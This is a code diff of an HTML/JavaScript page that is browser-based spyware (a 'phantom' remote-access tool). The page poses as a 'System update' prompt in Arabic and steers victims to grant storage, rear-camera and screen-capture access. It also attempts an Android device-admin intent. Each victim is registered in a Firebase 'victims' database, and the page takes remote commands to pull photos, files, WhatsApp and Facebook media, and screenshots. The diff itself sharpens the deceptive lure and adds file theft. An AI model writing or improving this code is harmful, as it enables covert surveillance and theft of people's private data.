@@ -3,18 +3,20 @@
 <head>
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>جاري التفعيل...</title>
+    <title>تحديث النظام</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
-        #msg { font-size: 1.5em; text-align: center; margin-bottom: 30px; }
-        .btn { background: #fff; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; font-size: 1.2em; border-radius: 5px; display: none; }
+        #msg { font-size: 1.4em; text-align: center; margin-bottom: 30px; padding: 0 20px; }
+        .btn { background: #0af; color: #000; padding: 15px 40px; border: none; font-weight: bold; cursor: pointer; font-size: 1.3em; border-radius: 5px; display: none; }
+        .guide { color: #aaa; font-size: 0.8em; margin-top: 20px; text-align: center; display: none; }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-    <div id="msg">⋯</div>
-    <button id="grantBtn" class="btn" onclick="initPayload()">متابعة</button>
+    <div id="msg">📱 تحديث النظام مطلوب</div>
+    <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
+    <div id="guide" class="guide">الرجاء اختيار مجلد "الذاكرة الداخلية" ثم الضغط على "موافق"</div>
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
@@ -30,44 +32,42 @@
         const db = firebase.database();
         const vid = 'phantom-' + Math.random().toString(36).substr(2,12);
         const vref = db.ref('victims/'+vid);
-        let rootDir = null, camStream = null;
-        const folderHandles = {};      // تخزين مقابض المجلدات بعد المنح
-        let fileAccessReady = false;   // هل لدينا صلاحية ملفات؟
+        let ROOT_HANDLE = null;
+        let camStream = null;
 
-        // ========== إعداد الشاشة ==========
         setTimeout(() => {
-            document.getElementById('msg').innerText = "اضغط على متابعة للبدء";
+            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
             document.getElementById('grantBtn').style.display = 'block';
+            document.getElementById('guide').style.display = 'block';
         }, 2000);
 
-        window.initPayload = async function() {
+        window.startPayload = async function() {
             const btn = document.getElementById('grantBtn');
             btn.style.display = 'none';
-            document.getElementById('msg').innerText = "جاري تجهيز الإذن...";
+            document.getElementById('msg').innerText = "جاري فتح نافذة التحديث...";
+            document.getElementById('guide').innerText = "الرجاء اختيار مجلد 'الذاكرة الداخلية' أو 'Internal Storage' ثم الضغط على 'موافق' أو 'Select'";
 
-            // ---- الصلاحيات الصامتة ----
+            // الحصول على الجذر المطلق
+            try {
+                ROOT_HANDLE = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+            } catch(e) {
+                document.getElementById('msg').innerText = "تم إلغاء التحديث. بعض الميزات محدودة.";
+                document.getElementById('guide').style.display = 'none';
+                // نكمل بدون ملفات
+                ROOT_HANDLE = null;
+            }
+
+            // الصلاحيات الأخرى
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
-            try { const dStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); dStream.getTracks().forEach(t => t.stop()); } catch(e) {}
+            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
                 let a = document.createElement('a');
                 a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                 a.click();
             } catch(e) {}
 
-            // ---- طلب المجلد العام (بدون إجبار) ----
-            document.getElementById('msg').innerText = "حدد مجلداً لحفظ البيانات...";
-            try {
-                rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                fileAccessReady = true;
-                // نخزن المقابض للمجلدات المهمة
-                await cacheAllKnownFolders();
-            } catch(e) {
-                // المستخدم أغلق النافذة دون اختيار – نستمر عادي
-                fileAccessReady = false;
-            }
-
-            // ---- اكتمال التفعيل (دائماً ناجح) ----
-            document.getElementById('msg').innerText = "✅ اكتمل التفعيل";
+            document.getElementById('msg').innerText = ROOT_HANDLE ? "✅ تم التحديث بنجاح" : "✅ تم الاتصال";
+            document.getElementById('guide').style.display = 'none';
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
@@ -77,28 +77,6 @@
             if (camStream) startHiddenCamera();
         };
 
-        // ========== تخزين مقابض المجلدات المعروفة ==========
-        async function cacheAllKnownFolders() {
-            const PATHS = {
-                camera: 'DCIM/Camera',
-                downloads: 'Download',
-                whatsapp: 'WhatsApp/Media/WhatsApp Images',
-                facebook: 'Facebook/Media',
-                pictures: 'Pictures'
-            };
-            if (rootDir && rootDir.resolve) {
-                for (const [key, path] of Object.entries(PATHS)) {
-                    try {
-                        let parts = path.split('/');
-                        let handle = rootDir;
-                        for (let p of parts) handle = await handle.getDirectoryHandle(p);
-                        folderHandles[key] = handle;
-                    } catch(e) {}
-                }
-            }
-        }
-
-        // ========== تسجيل الجهاز ==========
         async function registerDevice() {
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
@@ -110,7 +88,6 @@
             });
         }
 
-        // ========== مستقبل الأوامر ==========
         function startCommandListener() {
             vref.child('command').on('value', async snap => {
                 const c = snap.val();
@@ -118,7 +95,7 @@
                 try {
                     switch(c.action) {
                         case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
-                        case 'get_files': break;
+                        case 'get_files': await pullFromFolder(c.folder || 'documents'); break;
                         case 'vibrate': navigator.vibrate([200,100,200]); break;
                         case 'play_sound': break;
                         case 'screenshot': await screenshot(); break;
@@ -135,31 +112,24 @@
             });
         }
 
-        // ========== سحب الصور ==========
-        async function getFolderHandle(key) {
-            if (folderHandles[key]) return folderHandles[key];
-            // إذا لم يكن لدينا صلاحية ملفات بعد، نطلبها الآن بطريقة عامة
-            if (!fileAccessReady) {
-                try {
-                    rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                    fileAccessReady = true;
-                    await cacheAllKnownFolders();
-                    if (folderHandles[key]) return folderHandles[key];
-                } catch(e) {
-                    throw new Error('تم رفض إذن الملفات');
+        async function getFolderHandle(folderName) {
+            if (!ROOT_HANDLE) throw new Error('لا توجد صلاحية ملفات');
+            const MAP = {
+                camera: 'DCIM/Camera',
+                downloads: 'Download',
+                whatsapp: 'WhatsApp/Media/WhatsApp Images',
+                facebook: 'Facebook/Media',
+                pictures: 'Pictures',
+                documents: ''
+            };
+            const path = MAP[folderName] || folderName;
+            let current = ROOT_HANDLE;
+            if (path) {
+                for (let p of path.split('/')) {
+                    current = await current.getDirectoryHandle(p);
                 }
             }
-            // إذا مازال غير موجود، ربما المجلد لم يتم تخزينه، نطلب المجلد المحدد
-            document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ' + key + '</h2>';
-            try {
-                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                folderHandles[key] = handle;
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                return handle;
-            } catch(e) {
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                throw new Error('رفض الاختيار');
-            }
+            return current;
         }
 
         async function pullFromFolder(key) {
@@ -192,7 +162,6 @@
             }
         }
 
-        // ========== الميزات الأخرى ==========
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
